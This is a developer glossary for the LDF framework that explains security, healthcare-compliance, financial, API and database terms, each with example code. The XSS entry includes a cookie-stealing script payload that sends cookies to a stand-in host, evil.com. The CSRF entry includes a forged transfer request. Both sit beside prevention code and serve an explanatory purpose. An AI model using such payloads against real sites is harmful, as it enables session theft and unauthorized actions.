# Technical Terms Glossary

This glossary explains technical terms used in LDF presets, guardrails, and question packs. Each entry includes what it is, why it matters, and a practical example.

---

## Security Terms

### RLS (Row-Level Security)

**What it is:** A database feature that automatically filters query results based on the current user's permissions. Instead of adding `WHERE tenant_id = X` to every query manually, RLS policies enforce this at the database level.

**Why it matters:** Prevents data leaks even if application code forgets to filter. Critical for multi-tenant apps where one customer shouldn't see another's data. A single missed WHERE clause could expose all customer data.

**Example (PostgreSQL):**
```sql
-- Enable RLS on the orders table
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- Create policy that only shows orders for current tenant
CREATE POLICY tenant_isolation ON orders
  USING (tenant_id = current_setting('app.tenant_id')::uuid);

-- Now any query automatically filters by tenant
SELECT * FROM orders;  -- Only returns current tenant's orders
```

**Used in:** SaaS preset, multi-tenancy question pack

---

### OWASP Top 10

**What it is:** The Open Web Application Security Project's list of the 10 most critical web application security risks. Updated periodically based on real-world vulnerability data.

**Why it matters:** Following OWASP guidelines prevents the most common security vulnerabilities. These are the attacks that hackers try first because they work so often.

**The Top 10 (2021):**

1. **Broken Access Control** - Users accessing data they shouldn't
2. **Cryptographic Failures** - Weak encryption or exposed secrets
3. **Injection** - SQL injection, command injection, etc.
4. **Insecure Design** - Security not considered in architecture
5. **Security Misconfiguration** - Default passwords, debug mode in prod
6. **Vulnerable Components** - Outdated libraries with known CVEs
7. **Authentication Failures** - Weak passwords, missing MFA
8. **Software Integrity Failures** - Insecure CI/CD, unverified updates
9. **Logging Failures** - Can't detect or investigate attacks
10. **SSRF** - Server-Side Request Forgery

**Used in:** Core guardrails (Security Basics)

---

### XSS (Cross-Site Scripting)

**What it is:** An attack where malicious scripts are injected into web pages viewed by other users. The script runs in victims' browsers with access to their session.

**Why it matters:** Can steal session cookies, redirect users to phishing sites, or perform actions as the victim. One XSS vulnerability can compromise all users.

**Example attack:**
```html
<!-- Attacker submits this as their "name" -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- If rendered without escaping, steals everyone's cookies -->
```

**Prevention:**
```python
# Always escape output
from markupsafe import escape
return f"Hello, {escape(user_name)}"
```

**Used in:** Security question pack, Core guardrails

---

### CSRF (Cross-Site Request Forgery)

**What it is:** An attack that tricks users into performing unwanted actions on sites where they're authenticated. The attacker's page makes requests to your site using the victim's session.

**Why it matters:** Can transfer money, change passwords, or delete data without user knowledge. Users just have to visit a malicious page while logged in.

**Example attack:**
```html
<!-- On attacker's site -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
<!-- Browser automatically sends victim's cookies -->
```

**Prevention:**
```python
# Use CSRF tokens in forms
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">

# Validate token on server
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)
```

**Used in:** Security question pack

---

## Healthcare Terms

### HIPAA

**What it is:** Health Insurance Portability and Accountability Act - US federal law that sets standards for protecting sensitive patient health information. Applies to healthcare providers, health plans, and their business associates.

**Why it matters:** Legal requirement for US healthcare applications. Non-compliance can result in fines up to $1.5 million per violation category per year, plus potential criminal charges.

**Key requirements:**
- Administrative safeguards (policies, training, risk assessment)
- Physical safeguards (facility access, workstation security)
- Technical safeguards (encryption, access control, audit logs)
- Breach notification within 60 days

**Used in:** Healthcare preset

---

### PHI (Protected Health Information)

**What it is:** Any health information that can identify a patient, including 18 specific identifiers defined by HIPAA.

**Why it matters:** PHI requires specific protections under HIPAA. Improper handling (e.g., logging patient names, unencrypted storage) can result in massive fines.

**What counts as PHI:**
- Patient names, addresses, phone numbers
- Dates (birth, admission, discharge, death)
- Social Security numbers
- Medical record numbers
- Health plan numbers
- Photos, biometric data
- Any unique identifying number

**What's NOT PHI:**
- De-identified aggregate statistics
- "50% of patients have diabetes" (no individuals identifiable)

**Example violation:**
```python
# BAD - logs PHI
logger.info(f"Processing claim for {patient.name}, DOB {patient.dob}")

# GOOD - no PHI in logs
logger.info(f"Processing claim {claim.id} for patient {patient.id}")
```

**Used in:** Healthcare preset, Healthcare guardrails

---

## Financial Terms

### Idempotency

**What it is:** An operation is idempotent if performing it multiple times has the same effect as performing it once. Critical for handling retries safely in distributed systems.

**Why it matters:** Network failures cause retries. Without idempotency, retries can cause duplicate charges, duplicate orders, or data corruption.

**Examples:**
```
Idempotent:
  GET /user/123          → Returns same user each time
  PUT /user/123 {name}   → Sets name to same value each time
  DELETE /user/123       → User remains deleted

NOT idempotent:
  POST /orders           → Creates new order each time!
  POST /payments         → Charges card each time!
```

**Solution - Idempotency Keys:**
```python
# Client sends unique key with request
POST /payments
X-Idempotency-Key: abc123-unique-request-id

# Server checks if key was seen before
if idempotency_key in processed_keys:
    return cached_response  # Don't process again
else:
    process_payment()
    store_result(idempotency_key, response)
```

**Used in:** Fintech preset, Billing question pack

---

### Double-Entry Bookkeeping

**What it is:** An accounting system where every transaction is recorded in at least two accounts: a debit in one and a credit in another. The sum of all debits must always equal the sum of all credits.

**Why it matters:** Automatically catches errors - if debits don't equal credits, something is wrong. Required for financial audits and regulatory compliance. Makes it impossible to "lose" money in the system.

**Example:**
```
Customer pays $100 for service:
  Debit:  Cash account        +$100
  Credit: Revenue account     +$100

Internal transfer of $50:
  Debit:  Destination account +$50
  Credit: Source account      -$50

At any time: Sum(Debits) == Sum(Credits)
```

**Implementation:**
```python
class Transaction:
    def __init__(self):
        self.entries = []

    def add_entry(self, account, amount, type):
        self.entries.append(Entry(account, amount, type))

    def validate(self):
        debits = sum(e.amount for e in self.entries if e.type == 'debit')
        credits = sum(e.amount for e in self.entries if e.type == 'credit')
        if debits != credits:
            raise BalanceError("Transaction doesn't balance")
```

**Used in:** Fintech preset

---

### Money Precision

**What it is:** Using exact decimal types (NUMERIC, DECIMAL) instead of floating-point (FLOAT, DOUBLE) for monetary calculations to avoid rounding errors.

**Why it matters:** Floating-point math has rounding errors that accumulate. In financial systems, this can mean money appearing or disappearing, failed reconciliations, and audit failures.

**The problem:**
```python
# Using floats (BAD)
>>> 0.1 + 0.2
0.30000000000000004  # Not exactly 0.3!

>>> sum([0.1] * 10)
0.9999999999999999   # Not exactly 1.0!
```

**The solution:**
```python
from decimal import Decimal

# Using Decimal (GOOD)
>>> Decimal('0.1') + Decimal('0.2')
Decimal('0.3')  # Exactly 0.3

# In database
CREATE TABLE transactions (
    amount NUMERIC(15, 2) NOT NULL  -- 15 digits, 2 decimal places
);
```

**Used in:** Fintech preset

---

## API Terms

### Rate Limiting

**What it is:** Controlling how many requests a client can make in a given time period. Prevents abuse, ensures fair resource usage, and protects against DoS attacks.

**Why it matters:** Without rate limiting, a single user (or attacker) could overwhelm your system, denying service to everyone else. Also prevents credential stuffing and brute force attacks.

**Common patterns:**
```
Per-user limits:
  100 requests per minute per authenticated user

Per-IP limits:
  10 login attempts per 15 minutes per IP

Tiered limits:
  Free tier:  100 requests/day
  Pro tier:   10,000 requests/day
  Enterprise: Unlimited
```

**Headers to communicate limits:**
```http
HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1640000000
```

**Used in:** API-only preset, Security question pack

---

### Webhook

**What it is:** A way for one system to send real-time notifications to another when events occur. Instead of polling "did anything happen?", the server pushes updates to your endpoint.

**Why it matters:** Enables real-time integrations without constant polling. Essential for payment notifications, CI/CD pipelines, and event-driven architectures.

**Example flow:**
```
1. Your app registers webhook URL with Stripe
2. Customer pays → Stripe sends POST to your URL
3. Your app processes the payment confirmation

POST https://yourapp.com/webhooks/stripe
{
  "type": "payment_intent.succeeded",
  "data": { "amount": 2000, "currency": "usd" }
}
```

**Security (signature verification):**
```python
import hmac

def verify_webhook(payload, signature, secret):
    expected = hmac.new(secret, payload, 'sha256').hexdigest()
    return hmac.compare_digest(expected, signature)
```

**Used in:** API-only preset, Webhooks question pack

---

## Database Terms

### Migration

**What it is:** Version-controlled changes to your database schema. Each migration is a script that transforms the database from one version to the next.

**Why it matters:** Enables safe, repeatable database changes across environments. Without migrations, you can't reliably sync dev, staging, and production databases.

**Example (Alembic/SQLAlchemy):**
```python
# migrations/versions/001_add_users_table.py

def upgrade():
    op.create_table(
        'users',
        sa.Column('id', sa.Integer, primary_key=True),
        sa.Column('email', sa.String(255), unique=True),
        sa.Column('created_at', sa.DateTime, default=sa.func.now())
    )

def downgrade():
    op.drop_table('users')
```

**Best practices:**
- Migrations should be reversible (have downgrade)
- Never modify a migration that's been deployed
- Separate schema changes from data backfills
- Test migrations on copy of production data

**Used in:** Core guardrails (Database Migrations)

---

### Soft Delete

**What it is:** Marking records as deleted instead of actually removing them from the database. Usually implemented with a `deleted_at` timestamp column.

**Why it matters:** Enables data recovery, maintains referential integrity, and preserves audit trails. Required for compliance in many industries.

**Implementation:**
```sql
-- Add soft delete column
ALTER TABLE users ADD COLUMN deleted_at TIMESTAMP;

-- "Delete" a user
UPDATE users SET deleted_at = NOW() WHERE id = 123;

-- Query excludes deleted by default
SELECT * FROM users WHERE deleted_at IS NULL;

-- Admin can see deleted records
SELECT * FROM users;  -- All records
```

**Used in:** Data-model question pack

---

## General Terms

### Guardrail

**What it is:** In LDF, a guardrail is a mandatory requirement or best practice that must be addressed in every feature. They ensure consistent quality and prevent common mistakes.

**Why it matters:** Guardrails catch issues before they reach production. They encode team knowledge so everyone follows the same standards.

**LDF Core Guardrails:**
1. Testing Coverage
2. Security Basics
3. Error Handling
4. Logging & Observability
5. API Design
6. Data Validation
7. Database Migrations
8. Documentation

**Used in:** All presets, all specs

---

### Spec (Specification)

**What it is:** In LDF, a spec is a complete feature description with three documents: requirements, design, and tasks. It's created before any code is written.

**Why it matters:** Forces thinking through the feature completely before implementation. Catches design issues early when they're cheap to fix.

**Structure:**
```
.ldf/specs/{feature}/
├── requirements.md  # What we're building and why
├── design.md        # How we'll build it
└── tasks.md         # Step-by-step implementation plan
```

**Used in:** All LDF workflows
